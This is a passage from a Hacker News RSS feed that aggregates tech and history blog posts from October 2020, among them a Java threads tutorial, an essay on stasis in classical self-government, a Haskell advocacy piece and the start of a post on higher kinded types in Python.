<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://stacksoft.io/blog/kafka-troubles/">https://stacksoft.io/blog/kafka-troubles/</a></em></p>]]>
            </description>
            <link>https://stacksoft.io/blog/kafka-troubles/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24940623</guid>
            <pubDate>Fri, 30 Oct 2020 09:45:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Java Concurrency ‚Äì Understanding the Basics of Threads]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24940545">thread link</a>) | @turkogluc
<br/>
October 30, 2020 | https://turkogluc.com/java-concurrency-basics-of-threads/ | <a href="https://web.archive.org/web/*/https://turkogluc.com/java-concurrency-basics-of-threads/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                
                <p>Java <code>Thread</code> objects allow us to run our code in separate threads. When an application starts JVM creates the initial thread named <code>main</code>. The main method is run on the main thread. Inside the application we can create new threads to execute other tasks in parallel with the main thread.</p><p>Java uses native operating system threads. So one java thread is mapped by one OS thread.</p><h3 id="creating-threads">Creating Threads</h3><p>The constructor of the <code>Thread</code> class takes a <code>Runnable</code> object. Runnable interface has an abstract <code>run</code> method which is called by <code>Thread#start()</code> method. It object can be instantiated by a lambda, anonymous class or a class which implements Runnable method. </p><figure><img src="https://turkogluc.com/content/images/2020/10/Screenshot-2020-10-29-at-20.03.52.png"></figure><p>Using lambdas are generally easier and more compact:</p><pre><code>Thread thread = new Thread(() -&gt; {
    // content of run command
});
thread.start();</code></pre><p>Thread lives as long as the its run hook method has not returned. The scheduler can suspend and run the Thread many times. For a thread to execute forever, it needs an infinite loop that prevents it from returning. </p><p><code>Join</code> method allows one thread to wait for the completion of another. This is a simple form of barrier synchronisation.</p><figure><img src="https://turkogluc.com/content/images/2020/10/Screenshot-2020-10-29-at-20.19.19.png"></figure><h3 id="java-thread-types-user-and-daemon-threads">Java Thread Types: User and Daemon Threads</h3><p>When JVM start it contains a single User thread, named Main thread. The main difference between User and Daemon threads are what happens when they exit.</p><ul><li>A user thread continues its lifecycle even if the main thread exits.</li><li>However all Daemon threads terminates when all the user threads exits.</li><li>JVM itself exits when all the user threads has exited.</li></ul><p>Thread class contains boolean <code>daemon</code> field to specify whether the thread is daemon. It can be set at the time of creation by the constructor or by setter method.</p><pre><code>Thread thread = new Thread(getRunnable());
thread.setDaemon(true);
thread.start();</code></pre><p>By default daemon field is false, so most of the Threads that we generate is a User Thread. Threads copy the <code>isDaemon</code> status of the parent threat if it is not specified. Java uses Daemon thread in some places such as <code>ForkJoinPool</code> and <code>Timer</code>. To illustrate we can use the following example:</p><pre><code>public class Main {

    public static void main(String[] args) throws InterruptedException, ExecutionException {
//        runDeamonThread();
        runUserThread();
        System.out.println(getCurrentThreadName() + " exits");
    }

    private static void runDeamonThread() throws ExecutionException, InterruptedException {
        ExecutorService executorService = Executors.newWorkStealingPool(10);
        executorService.execute(getRunnable());
    }

    private static void runUserThread() {
        Thread thread = new Thread(getRunnable());
        thread.start();
    }

    private static Runnable getRunnable() {
        return () -&gt; {
            for (int i = 0; i &lt;= 200; i++) {
                System.out.print(".");
                Thread.yield();
            }
            System.out.println(getCurrentThreadName() + " exits. isDeamon: " + isDaemon());
        };
    }

    private static boolean isDaemon() {
        return Thread.currentThread().isDaemon();
    }

    private static String getCurrentThreadName() {
        return Thread.currentThread().getName();
    }
}</code></pre><ul><li>When we invoke <code>runUserThread</code> method it show the following example output:</li></ul><pre><code>................................................
main exits
........................................................................................
Thread-0 exits. isDeamon: false</code></pre><ul><li>The second case is invoking the <code>runDeamonThread</code> which uses <code>ForkJoinPool</code> as an example of Daemon Threads. I could simply use <code>setDaemon(true)</code> method, but wanted to give an example usage. Output:</li></ul><pre><code>main exits</code></pre><p>So when the main method exits, all the user threads are terminated and JVM exits and kills all daemon threads, so that we did not even have a chance to see output from daemon threads.</p><h3 id="stopping-threads">Stopping Threads</h3><p>Compared to creating, stopping a thread is quite hard thing. Once thread starts running it diverges from the caller and it has it is own lifecycle anymore. It can either complete the task and exits or if it does a long running operation it can work forever. Java does not provides us a method (non-deprecated) to stop the thread voluntarily. </p><ol><li>A naive approach could be using a stop flag:</li></ol><pre><code>volatile boolean isStopped = false;

public void test() {
    new Thread(() -&gt; {
        while (!isStopped) {
            System.out.print(".");
        }
        System.out.println("Child Exits");
    }).start();

    try {
        Thread.sleep(100);
    } catch (InterruptedException e) {
        e.printStackTrace();
    }
    isStopped = true;
    System.out.println("Main exits");
}</code></pre><p>Note that the flag is <code>volatile</code> in order to make its up-to-date value visible for both threads. However this approach fails if the thread is doing blocking operations such as <code>sleep</code>, <code>wait</code>, <code>join</code> or blocking I/O operations.</p><p>2. Another way to stop the tread is to use <code>interrupt()</code> method of the thread. </p><blockquote>An interrupt request to a thread is an indication that it should stop what it is doing and do something else. It is up to the programmer to decide exactly how a thread responds to an interrupt but it is very common for the tread to terminate.</blockquote><p>For the interrupt mechanism to work correctly, the interrupted thread must support its own interruption mechanism. There are 2 cases we can examine for interruption:</p><ul><li>Non Blocking and Long Running Tasks</li></ul><p>In this case calling the <code>thread.interrupt()</code> method will set the interrupt flag of the that thread but if the task itself does not check the status of the interrupted flag it will not have any impact. For example:</p><pre><code>public void test() throws InterruptedException {
    Thread thread = new Thread(() -&gt; {
        System.out.println("Child Starts");
        while (true) {
            System.out.print(".");
        }
    });

    thread.start();
    thread.interrupt();
    
    thread.join();
    System.out.println("Main exits");
}</code></pre><p>In order for the thread to catch the interrupt, it should iteratively check the status of the interrupt flag so that it can understand if there are any pending interruption request and handle the request accordingly. </p><p>So we can check the flag in our while loop in if it is true we can return or break the loop. In the lambda expression it is not possible to throw an exception but in appropriate places we can throw <code>InterruptedException</code> as well.</p><pre><code>public void test() throws InterruptedException {
    Thread thread = new Thread(() -&gt; {
        System.out.println("Child Starts");
        while (true) {
            if (Thread.interrupted()) {
                break;
            }
            System.out.print(".");
        }
        System.out.println("Child exits");
    });

    thread.start();
    thread.interrupt();

    thread.join();
    System.out.println("Main exits");
}</code></pre><p>Note the <code>Thread.interrupted()</code> method returns the value of the flag and clears it if it has been true. So if we want to keep the state of the Thread as interrupted for the upper level of stack, we can set it back with <code>Thread.currentThread().interrupt();</code> </p><ul><li>Blocking Tasks</li></ul><p>If a thread frequently calls the blocking methods such as <code>wait</code>, <code>join</code>, <code>sleep</code>, <code>blocking I/O</code> which are all run interruptively, these methods internally check if they have been interrupted and if so they automatically throw <code>InterruptedException</code>. This exception should be caught and handled in the appropriate context. The following example uses the interruption to break the loop in a blocking <code>sleep</code> operation:</p><pre><code>public void test() throws InterruptedException {
    Thread thread = new Thread(() -&gt; {
        System.out.println("Child Starts");
        try {
            while (true) {
                Thread.sleep(10000);
            }
        } catch (InterruptedException e) {
            System.out.println("Thread interrupted: " + e.getMessage());
        }
        System.out.println("Child Exits");
    });

    thread.start();
    thread.interrupt();

    thread.join();
    System.out.println("Main exits");
}</code></pre><p>There are patterns for dealing with Java <code>InterruptedException</code>:</p><ul><li>One approach is propagating the exception to the callers, so higher layer would be responsible.</li><li>Before re-throwing, we can do task specific clean up.</li><li>If it is not possible to re-throw, we can set the interrupted status to true again with <code>Thread.currentThread().interrupt()</code> to preserve the evidence if the higher layers want to check it.</li></ul><p>So as a conclusion if we want to implement cancellable tasks we need to periodically check the status of the interrupt status and handle the interruption in a way that thread will exit.</p><h3 id="thread-groups">Thread Groups</h3><p>In order to simplify thread management, multiple threads &nbsp;can be organised with <code>java.lang.ThreadGroup</code> objects that group related threads. Each Thread Group needs to have a parent group. In the hierarchy, there is the <code>Main</code> group which is the parent of the other groups or threads we create in the program. We can create <code>ThreadGroup</code> by calling its constructor with a parent group and/or name. To add the Threads in a group we need to specify the group in the Thread's constructor.</p><pre><code>public void test() {
    ThreadGroup tg1 = new ThreadGroup("Thread-group-1");
    ThreadGroup tg2 = new ThreadGroup(tg1, "Thread-group-2");

    Thread thread1 = new Thread(tg1,"thread-1");
    Thread thread2 = new Thread(tg2,"thread-2");
    Thread thread3 = new Thread(tg2,"thread-3");

    thread1.start();
    thread2.start();
    thread3.start();
    
    Thread[] threads = new Thread[tg2.activeCount()];
    tg2.enumerate(threads);

    Arrays.asList(threads).forEach(t -&gt; System.out.println(t.getName()));
    tg1.list();
}</code></pre><p>We can iterate over the threads by calling the <code>enumerate</code> method, which fills the given array with the thread references of the group.</p><p>We can implement a Thread Pool by making use of Thread Groups:</p><pre><code>public class ThreadPool {
    // Create a thread group field
    private final ThreadGroup group = new ThreadGroup("ThreadPoolGroup");
    // Create a LinkedList field containing Runnable
    private final List&lt;Runnable&gt; tasks = new LinkedList&lt;&gt;();

    public ThreadPool(int poolSize) {
   ‚Ä¶</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://turkogluc.com/java-concurrency-basics-of-threads/">https://turkogluc.com/java-concurrency-basics-of-threads/</a></em></p>]]>
            </description>
            <link>https://turkogluc.com/java-concurrency-basics-of-threads/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24940545</guid>
            <pubDate>Fri, 30 Oct 2020 09:32:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CMAF is available in Ant Media Server v2.2]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24940533">thread link</a>) | @kerrarbone
<br/>
October 30, 2020 | https://antmedia.io/cmaf-is-available-in-ant-media-server-v2-2/ | <a href="https://web.archive.org/web/*/https://antmedia.io/cmaf-is-available-in-ant-media-server-v2-2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://antmedia.io/cmaf-is-available-in-ant-media-server-v2-2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24940533</guid>
            <pubDate>Fri, 30 Oct 2020 09:28:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The fragility of self-government in classical Europe ‚Äì Bret Devereaux]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24940298">thread link</a>) | @daddylonglegs
<br/>
October 30, 2020 | https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Hey folks!  Fireside this week, but I promise we‚Äôll see that promised addendum on pre-modern crucible steel and cast iron next week.  In the meantime, as you are no doubt inescapably aware, the United States (where I live) is having an election.  I mostly avoid politics itself on this blog and that‚Äôs something I intend to keep doing, but I thought that this particular moment was a good time to explain how my studies influence my own political thinking.  After all, I went on about how<a href="https://acoup.blog/2020/07/03/collections-the-practical-case-on-why-we-need-the-humanities/"> ‚Äúmen have no more ready corrective of conduct than knowledge of the past‚Äù</a> (Plb. 1.1.1), so with a momentous decision to be made, I thought I would talk about about how that ready corrective influences my own conduct as a citizen.</p>



<figure><img data-attachment-id="4924" data-permalink="https://acoup.blog/img_20200305_192249/" data-orig-file="https://acoupdotblog.files.wordpress.com/2020/10/img_20200305_192249.jpg" data-orig-size="2909,2387" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3a&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1583436169&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;1038&quot;,&quot;shutter_speed&quot;:&quot;0.066683&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_20200305_192249" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2020/10/img_20200305_192249.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2020/10/img_20200305_192249.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2020/10/img_20200305_192249.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2020/10/img_20200305_192249.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2020/10/img_20200305_192249.jpg?w=2048 2048w, https://acoupdotblog.files.wordpress.com/2020/10/img_20200305_192249.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2020/10/img_20200305_192249.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2020/10/img_20200305_192249.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>For those worried that this blog too will slip down into the grasping black hole that is American politics, worry note: this will not be a regular occurrence.  As normal, I‚Äôll have some recommendations on things to read and listen to (history and national security, not politics) at the end.</p>



<p>Also, in the name of my sanity, I am going to go ahead and disable comments on this post rather than invite an angry political discussion which might well lead to unkind words being said from one reader to the next (I am quite OK with people saying unkind words about me ‚Äì I‚Äôm on twitter, after all ‚Äì but I‚Äôd rather not have a civil war in my comments) or invite the swarm of internet trolls to descend upon our fair little community here.  If you do want to discuss the recommendations, <a href="https://acoup.blog/2020/10/23/things-you-might-have-missed-october-21-2020/">let‚Äôs all agree to go do that in last week‚Äôs post‚Äôs comments</a>.</p>



<p>On with the show!</p>



<p>One thing that emerges quite clearly from a study of Greek and Roman antiquity is the<strong> intense fragility of self-government</strong>.  That fragility is easy to miss in a modern context (to the point that it is occasionally argued that so-called ‚Äò<a href="https://en.wikipedia.org/wiki/Democratic_consolidation">consolidated</a>‚Äò democracies are self-sustaining) in part because the sample size is so small and recent, relatively speaking.  By some measures, the United States is, in fact, the <a href="https://www.politifact.com/factchecks/2016/jul/11/paul-ryan/paul-ryan-claims-us-oldest-democracy-world-he-righ/">world‚Äôs oldest current democracy </a>at just 232 years. In practice, the German democracy is about 65 years old (and only 30 years fully united); the Fifth French Republic is even younger, just 62 (though if we want to count from the beginning of the Third Republic, we get a more impressive 150 years). The great majority of democracies are even younger. Moreover, there just aren‚Äôt that many of them; <a href="https://en.wikipedia.org/wiki/Democracy_Index">the Democracy Index </a>figures there are only 76 democracies currently, out of 167 states it tracks and that‚Äôs very near to the highest the number has ever been.</p>



<p><strong>The ancient sample-set is much more robust! </strong> For much of the last millennium B.C., Greece and Italy (not merely Rome, but the array of other similarly structured Italic communities) were <em>filled</em> with small self-governing communities of citizens. I don‚Äôt want to get into the weeds of how democratic these states were, or their government structure, or we will be here all week. Needless to say, there is a <em>very robust</em> argument about that topic among ancient historians that continues to this day (I‚Äôll toss some bibliography on the topic at the end). What matters here is that these self-governing communities were just that: <em>self</em>-governing, with a citizen body that largely governed itself, by more-or-less democratic means in governments that were more-or-less republics (in our modern sense of the term).</p>



<p><strong>And it is in observing that sample that it becomes clear that these systems of government can be very fragile</strong> <strong>internally</strong>.  Patterns also emerge as to how such systems break down.  The cycle of breakdown was sufficiently common that the Greeks had a nice, compact word for it: <em>stasis</em> (œÉœÑŒ¨œÉŒπœÇ, pronounced STAH-sis, not STAY-sis.  The nearest Latin equivalent is <em>factio</em>, but Roman authors ‚Äì especially Cicero ‚Äì also translate <em>stasis</em> as <em>seditio</em>).  At its root, a <em>stasis</em> was ‚Äòa standing‚Äô (the ‚Äòsto-‚Äò root to mean ‚Äòstand‚Äô is common in many Indo-European languages), but rather than our word stasis (from the same root) which meant a standing <strong>still</strong>, <em>stasis</em> came to mean a ‚Äòstanding together‚Äô and from there a ‚Äòfaction‚Äô or political party, and then ‚Äòfactionalism‚Äô and finally from that meaning, ‚Äòcivil strife‚Äô and even ‚Äòrevolution.‚Äô</p>



<p><em>Stasis</em> began in the normal political rivalries and competition within the self-governing community, almost always, in the Greek or Roman context, breaking down on wealth and status lines, with the more numerous, but poorer, common citizenry pushing for a larger role and greater rights within the community, resisted by the elite who argued for the importance of ‚Äòtraditional‚Äô government (which may or may actually have been traditional or legal ‚Äì Roman aristocrats spent 133 BC arguing for their ‚Äòtraditional right‚Äô to lease patently illegal ‚Äì for once the Romans had written this law down ‚Äì amounts of state lands at artificially low prices) and their own traditional prerogatives.</p>



<p>That said often ‚Äì as with our current politics ‚Äì those political factions were not as neat as that description suggests, with some wealthy elites allying themselves (cynically or sincerely) with the faction of ‚Äòthe People,‚Äô while at the same time, a great many clients, middling farmers and regular people clearly supported the factions of ‚Äòthe few‚Äô or ‚Äòthe best‚Äô or whatever the more oligarchic faction called itself.  After all, all of those <em>optimates</em> Roman senators had to <em>get into the Senate</em> (by winning election to at least the <a href="https://en.wikipedia.org/wiki/Quaestor">quaestorship</a>) somehow; somebody voted for them!  Thucydides, in describing <em>stasis</em>, makes it quite clear that members even of the same families might often end up on opposite sides of civil strife.</p>



<p><strong>Of course, such negotiations of power are the basis of politics and were nothing new. </strong> What changes as a community lurched towards <em>stasis</em> was the steady erosion of the norms, traditions and simple restraint that made self-government possible.  This process was obvious enough ‚Äì with so many examples ‚Äì that it is explained and discussed in a number of the ancient sources (most notably Thuc. 3.82-86, but note also Hdt. 1.59; Plb. 6.3.9-13; Arist. <em>Ath. Pol</em>. 2, 5, 13; Plut. <em>Sol</em>. 13, 29).  Simply put, the two political factions would be locked in a cycle of escalation, neither willing to compromise but rather using the previous outrages of the other faction to justify the future outrages of their own faction.  Thucydides notes how this had a sorting effect, ‚Äúuntil even blood became a weaker tie than party‚Äù (Thuc. 3.82.6).</p>



<p><strong>That escalation damaged the essential social trust that allowed the society to function</strong> (and violence damaged the prosperity which made competition even fiercer). <strong> The decline of trust makes the ‚Äòtrap‚Äô of <em>stasis</em> self-reinforcing: as trust declines and more decisions are made as cynical calculations </strong>(Thuc. 3.82.1-3) it becomes harder and harder to broker a deal to end the strife that all sides will trust and respect, particularly because <em>stasis</em> tended first to cannibalize any moderate figures or factions.  The endpoint, of course, was self-destructive violence as the last limits and norms broke under the weight of escalating competition. <strong> The most common result of that violence was the emergence of tyranny ‚Äì one man strongman rule, although sometimes (typically with foreign support) one faction would ‚Äòwin‚Äô and massacre their opponents ‚Äì their usual reward was becoming an exploited puppet government to a self-interested outside power; they had merely exchanged a domestic tyrant for a foreign one</strong>.    That ancient authors could present a <strong><em>system</em> </strong>to <em>stasis</em> speaks to how relatively often it happened ‚Äì from the sources it certainly seems like, with so many small Greek and Italian states, at least one of them was going through <em>stasis</em> at one point or another.</p>



<p><strong>But in that large sample size, we also get a sense of what solutions succeed and what solutions fail to hold together a self-governing community in these sorts of pressures</strong>.  Beset by repeated political crises from 494 to 287 (known as the <a href="https://en.wikipedia.org/wiki/Conflict_of_the_Orders">Struggle of the Orders</a>), the Roman Republic repeatedly survived and grew stronger through <strong>compromise and by constructive, inclusive redefinition</strong> of the republic to include a broader range of people (not merely the patrician elite, but also the plebeian elite).  In no small part, that success seems to have been motivated by the avowed need of elite patricians for the support of the plebeian commons in order to campaign, since the plebeians made up most of the army.</p>



<p>In stark contrast, the effort by conservative (in the general sense, not in the American sense) elements of the Roman senate to ‚Äòhold the line‚Äô and permit no compromise on questions of land reform and citizenship in the Late Republic led quite directly to the outbreak of civil war in 91 (with the Italian allies) and in 88 (between Romans) and consequently to the collapse of the Republic.  Initially, the influence and raw power of the elite was sufficient to squash efforts at reform (including the murder of <a href="https://en.wikipedia.org/wiki/Gracchi">some prominent reformers</a>), but in the long run the discontent those crackdowns created laid the fertile ground for the rise of demagogic military leaders to supplant the Republic entirely, culminating in first Caesar and then Octavian doing just that.  <strong>In an effort to compromise on nothing, the Roman elite lost <em>everything</em>.</strong></p>



<p>The Greek experience offers a similar lesson.  Thucydides presents a quite moving passage describing the destructiveness of <em>stasis</em> which stresses that ‚Äì again and again, because this cycle repeated itself in many <em>poleis</em>, being a common feature of systems of self-government ‚Äì <strong>efforts by one faction within a <em>polis</em> community to ‚Äòwin‚Äô the conflict merely led to the decay of moderation and the laws</strong>;<strong> there were no victors in <em>stasis</em>, only survivors</strong>.  The continued <em>stasis</em> was so destructive that ‚Äòwinning‚Äô merely left the badly weakened <em>polis</em> easy prey for the malign influence of outside powers.  It turns out the point at which you ‚Äúget tired of winning‚Äù is roughly the point that your domestic <em>stasis</em> makes ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/">https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24940298</guid>
            <pubDate>Fri, 30 Oct 2020 08:39:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Haskell: The Good Parts]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24940075">thread link</a>) | @_query
<br/>
October 30, 2020 | https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55 | <a href="https://web.archive.org/web/*/https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>by Marc Scholten, 29.10.2020</em></p>

<p>
There‚Äôs been a recent blog post <a href="https://www.snoyman.com/blog/2020/10/haskell-bad-parts-1" target="_blank"><q>Haskell: The Bad Parts</q></a> in the haskell community. To keep things in balance and to spread some positive vibes we should also talk about the good parts of the haskell programming language and it‚Äôs ecosystem.
</p>

<p>
Here are some of the best parts we encountered while using Haskell at digitally induced. We focus on the advantages in the web dev space because that is what we are currently working on.
</p>

<h2>Type Safety</h2>
<p>
Haskell has one of the most impressive type systems of any programming language in practical use. If you have used TypeScript or other type safe languages in the past, you should be aware of the great advantages of having a type-checked codebase. Now think TypeScript - but 10x better. That‚Äôs how Haskell feels like.
</p>

<p>
You save a lot of time debugging runtime errors. Once the compiler approved your code, you can be pretty sure that it is working. This kind of development process is usually a lot more fun than debugging why something is <code>null</code> or <code>undefined</code>.
</p>

<p>
Once your system has hit a certain size and when new feature requests are rolling in you will want to make changes and refactor some parts of your code base. With Haskell you feel empowered to make changes to any part of your codebase.
</p>

<p>
Compare this to the ruby ecosystem: When working with rails you usually need to have lots of tests or otherwise you cannot confidently refactor code after things are running in production. And even then things will break. With the power of the type safety provided by Haskell, we can make refactorings whenever we want.
</p>

<p>
It‚Äôs really a blessing.
</p>

<h2>Managed Side Effects</h2>
<p>The way you deal with the file system, external APIs and user input is way different in Haskell than in other less functional programming languages. Your program consists of a main routine that handles the side effects and calls all your pure functions that do the real business logic.</p>

<p>
Systems build this way scale really well because there are less moving parts. Additionally pure functions can be easily tested and changed later on.
</p>

<p>
Most other languages encourage you to do side effects in an unrestricted way. For example when working in Java, a call to an object method might indirectly change the state of many related objects. This means you cannot easily reason about what a method calls does. In Haskell most functions are pure and thus don't trigger side effects like this. And when they do you can see this already by the function's type signature.
</p>

<p>
Haskell forces you to manage your side effects in a more careful way. You can still do IO and have mutable state, you just need to make this explicit inside the type signature. This leads to a far more robust system in overall.
</p>

<h2>Performance</h2>
<p>
Out of the box the performance of Haskell based web applications is great. It just feels faster than your typical Rails or PHP application. Thanks to it‚Äôs highly optimized runtime system it can also <a href="https://www.yesodweb.com/blog/2011/03/preliminary-warp-cross-language-benchmarks" target="_blank">handle way more requests than a nodejs application</a>.
</p>

<p>
And you get all that without ever thinking about performance at all. 
</p>

<h2>Tooling</h2>
<p>In 2020 it‚Äôs finally good. Thanks to <a href="https://github.com/haskell/haskell-language-server" target="_blank">Haskell Language Server</a> there‚Äôs now an easy way to have type information, documentation on hover and smart refactorings inside your text editor.</p>

<p>
With nix, cabal and stack we have the best tools for managing Haskell dependencies. Cabal hell is a thing of the past.
</p>

<p>
Great things are also happening to the Haskell compiler itself. <a href="https://github.com/ghc-proposals/ghc-proposals/pull/282" target="_blank">We soon can write dot expressions as you know from most other programming languages:</a> <code>project.name</code> instead of <code>name project</code>.
</p>

<h2>Hiring Haskell Developers</h2>
<p>
Haskell is a secret super power in that regard. The Haskell community consists of many very smart and talented software engineers. Haskell developers usually learn about Haskell because they care about their craft and about building high quality software products instead of learning about it to get a high paying job. Exactly the kind of people you want in your team.
</p>

<h2>2020 Haskell is Ready for Prime Time</h2>
<p>
For years there has been this trend of growing use of type safety as well as the growing use of functional programming techniques. What language could fill this space better than Haskell. Haskell has really matured in the last years and in 2020 it feels like it‚Äôs finally ready to conquer the world.
</p>

<p>
If this post made you interested, <a href="https://ihp.digitallyinduced.com/" target="_blank">check out IHP, our batteries-included haskell web framework.</a>
</p></div></div>]]>
            </description>
            <link>https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55</link>
            <guid isPermaLink="false">hacker-news-small-sites-24940075</guid>
            <pubDate>Fri, 30 Oct 2020 08:02:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Higher Kinded Types in Python]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24939974">thread link</a>) | @lukastyrychtr
<br/>
October 30, 2020 | https://sobolevn.me/2020/10/higher-kinded-types-in-python | <a href="https://web.archive.org/web/*/https://sobolevn.me/2020/10/higher-kinded-types-in-python">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      <p><img src="https://dev-to-uploads.s3.amazonaws.com/i/73uvh47fvxfveqpz2xgi.png" alt="Cover image"></p>

<p><code>dry-python/returns@0.15</code> is <a href="https://github.com/dry-python/returns/releases/tag/0.15.0">released</a>! And it means that now anyone can use our Higher Kinded Types emulation in their projects.</p>

<p>In this post I will explain:</p>
<ul>
  <li>What Higher Kinded Types (HKTs) are and why they are useful</li>
  <li>How they are implemented and what limitations there are</li>
  <li>How can you use them in your own projects</li>
</ul>

<p>Without further ado, let‚Äôs talk about typing!</p>


      <h2 id="simple-types">
        
        <a href="#simple-types">Simple types</a>
        
      </h2>

<p>Typing is layered. Like a good cake. There are at least three layers that we are going to cover.</p>

<p>Simple (or flat) typing, like <code>x: int = 1</code>. This allows us to express simple types and their transformations. Like <code>int -&gt; str</code>:</p>

<div><div><pre><code><span>def</span> <span>stringify</span><span>(</span><span>arg</span><span>:</span> <span>int</span><span>)</span> <span>-&gt;</span> <span>str</span><span>:</span>
    <span>return</span> <span>str</span><span>(</span><span>arg</span><span>)</span>
</code></pre></div></div>

<p>A lot of languages like <code>go</code> and <code>php</code> do not go beyond this line. And they still work pretty well! These types are also sometimes called <code>*</code>-kinded. It can be understood as ‚Äúa place for just a single type argument‚Äù.</p>


    
      <h2 id="generic">
        
        <a href="#generic">Generic</a>
        
      </h2>

<p>Generic level is required to express ‚Äúnested‚Äù types. For example, you have a list of integers. In Python we annotate it as <code>List[int]</code> or <a href="https://www.python.org/dev/peps/pep-0585/"><code>list[int]</code></a> in Python <code>3.9</code>. This allows us to have types with other types as arguments. <code>List</code> can receive <code>int</code> or <code>str</code> or even another <code>List</code> as the type argument. This way we can nest type and types start to have their own structure.</p>

<p>Generics are much more interesting than simple types. And they can have multiple type arguments:</p>
<ul>
  <li>List has one: for values, so it has a kind of <code>* -&gt; *</code>. It can be understood as a type transformation <code>List -&gt; T = List[T]</code></li>
  <li>Dict has two: for keys and values, so it has a kind of <code>* -&gt; * -&gt; *</code>. It can be understood as a type transformation <code>Dict -&gt; K -&gt; V = Dict[K, V]</code></li>
  <li>And so on!</li>
</ul>

<p>This would be very helpful for us in the future, I promise.</p>

<p>We can also write transformations for generic types:</p>

<div><div><pre><code><span>def</span> <span>stringify_list_items</span><span>(</span><span>arg</span><span>:</span> <span>List</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>List</span><span>[</span><span>str</span><span>]:</span>
    <span>return</span> <span>[</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>]</span>
</code></pre></div></div>

<p>But, that is where things begin to be quite complicated.</p>

<p>How can this function work with other iterables like <code>set</code>, <code>frozenset</code>, <code>tuple</code>?
We can express this in Python as easy as:</p>

<div><div><pre><code><span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>):</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>But the typing part would be quite challenging. Let‚Äôs try several things.</p>


    
      <h3 id="common-interface">
        
        <a href="#common-interface">Common interface</a>
        
      </h3>

<p>The first obvious thing to try is <code>Iterable</code> protocol. It is builtin into Python and does what we need.</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>Iterable</span>

<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>Iterable</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>Iterable</span><span>[</span><span>str</span><span>]:</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>Let‚Äôs try it out:</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>([</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>]))</span>
<span># Revealed type is 'typing.Iterable[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>({</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>}))</span>
<span>#  Revealed type is 'typing.Iterable[builtins.str]'
</span>
